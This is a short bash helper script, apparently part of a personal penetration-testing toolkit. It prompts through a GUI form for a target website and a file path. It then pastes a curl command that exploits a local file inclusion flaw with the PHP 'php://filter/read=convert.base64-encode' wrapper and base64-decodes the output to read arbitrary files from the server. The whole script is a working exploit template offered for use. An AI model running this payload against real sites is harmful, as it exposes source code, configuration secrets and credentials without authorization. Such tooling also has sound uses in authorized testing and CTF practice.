#!/bin/bash

: '
LFI read files with php filter base64 encode
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website" "File"

WEBSITE=${form_data["Website"]}
FILE=${form_data["File"]}

paste_command "curl -ks '${WEBSITE}php://filter/read=convert.base64-encode/resource=${FILE}' | base64 -d"
